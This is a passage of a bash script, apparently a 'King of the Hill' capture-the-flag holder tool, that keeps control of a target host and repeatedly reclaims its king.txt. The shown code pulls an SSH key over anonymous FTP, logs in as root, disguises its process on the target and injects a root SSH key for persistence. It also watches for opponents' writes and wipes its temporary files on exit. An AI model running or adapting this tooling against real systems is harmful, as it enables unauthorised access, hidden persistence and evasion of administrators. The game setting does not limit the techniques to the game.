    fi
    warn "SSH down — retry in ${backoff}s (attempt $((++attempts)))"
    sleep "$backoff"
    backoff=$(( backoff * 2 > max_backoff ? max_backoff : backoff * 2 ))
  done
}

# ─── Check king via 9999 ─────────────────────────────────────────────────────
check_king() {
  curl -s --max-time 4 "http://$TARGET:$KING_PORT/" 2>/dev/null | tr -d '\n'
}

# ─── Cleanup ─────────────────────────────────────────────────────────────────
cleanup() {
  [[ $CLEANUP -eq 1 ]] && ssh_run "rm -rf $WORK_DIR /tmp/._kh_* /tmp/._c 2>/dev/null" || true
  info "Session end — claims=$CLAIM_COUNT losses=$LOSS_COUNT log=$LOG_FILE"
}
trap cleanup EXIT INT TERM

# ═══════════════════════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════════════════════
info "kothholder v4 — target=$TARGET king='$KING_NAME' interval=${INTERVAL}s burst=${BURST}"
[[ -n "$DISGUISE_NAME" ]] && info "Disguise: $DISGUISE_NAME"
[[ $DO_INOTIFY -eq 1 ]] && info "inotify-based watch: enabled"
[[ $DO_AGGRESSIVE -eq 1 ]] && info "Aggressive mode: ON"

# Key acquisition
if [[ -z "$SSH_KEY" ]]; then
  ftp_pull_key || { err "No SSH key available — provide -i or ensure FTP anon works"; exit 1; }
fi
[[ -z "$SSH_USER" ]] && SSH_USER="root"

# Verify SSH
info "Connecting as $SSH_USER@$TARGET ..."
ensure_ssh
ok "SSH OK"

# Auto-detect
autodetect_vectors

# v4: Apply process disguise on target
[[ -n "$DISGUISE_NAME" ]] && apply_disguise

# v4: Start inotify watcher (background, falls back to poll if unavailable)
REMOTE_SEM="/tmp/._kh_inot_$$"
start_inotify_watcher

# Initial root key injection attempt
[[ $DO_INJECT -eq 1 ]] && inject_root_key

# v4: Start service self-healing watcher
start_service_watcher

ok "Starting hold loop (interval=${INTERVAL}s, burst=${BURST})"
echo ""

INOTIFY_SKIP_POLL=false
LAST_SSH_HEALTH=0

while true; do
  # Ensure we still have SSH (v4: auth-failure aware), but throttle checks
  # to reduce auth/log churn under controlled hold mode.
  now_ts=$(date +%s)
  if (( now_ts - LAST_SSH_HEALTH >= SSH_HEALTH_INTERVAL )); then
    LAST_SSH_HEALTH=$now_ts
    if ! ssh_alive 2>/dev/null; then
      warn "SSH dropped — reconnecting..."
      ensure_ssh
    fi
  fi

  # v4: Check inotify trigger first (instant reclaim on opponent write)
  if [[ $DO_INOTIFY -eq 1 ]] && check_inotify_trigger 2>/dev/null; then
    warn "inotify: king.txt write detected — immediate burst claim x${BURST}..."
    LOSS_COUNT=$((LOSS_COUNT + 1))
    result=$(do_claim_burst)
    CLAIM_COUNT=$((CLAIM_COUNT + BURST))
    [[ $VERBOSE -eq 1 ]] && info "inotify claim output: $result"
    sleep 0.3
    current=$(check_king)
    if [[ "$current" == "$KING_NAME" ]]; then
      ok "inotify reclaimed: $current ✓"; stat_line
      [[ $DO_INJECT -eq 1 ]] && [[ $ROOT_SSH_INJECTED -eq 0 ]] && inject_root_key
    else
      warn "inotify reclaim not confirmed — next poll will retry"
    fi
    INOTIFY_SKIP_POLL=true
  fi

  # Regular poll (skip this cycle if inotify already handled it)
  if ! $INOTIFY_SKIP_POLL; then
    current=$(check_king)

    if [[ "$current" == "$KING_NAME" ]]; then
      ok "King: $current ✓"; stat_line
    else
      warn "King lost (was '$current') — burst-claiming x${BURST}..."
      LOSS_COUNT=$((LOSS_COUNT + 1))

      result=$(do_claim_burst)
      CLAIM_COUNT=$((CLAIM_COUNT + BURST))

      [[ $VERBOSE -eq 1 ]] && info "Claim output: $result"

      # Rapid double-verify
      sleep 0.5
      current=$(check_king)
      if [[ "$current" == "$KING_NAME" ]]; then
        ok "Reclaimed! $current ✓"; stat_line
        [[ $DO_INJECT -eq 1 ]] && [[ $ROOT_SSH_INJECTED -eq 0 ]] && inject_root_key
      else
        sleep 0.5
        current=$(check_king)
        if [[ "$current" == "$KING_NAME" ]]; then
          ok "Reclaimed (2nd check) ✓"; stat_line
        else
          warn "Still '$current' — retrying next cycle"
        fi
      fi
    fi
  fi

  INOTIFY_SKIP_POLL=false
  sleep "$INTERVAL"
done
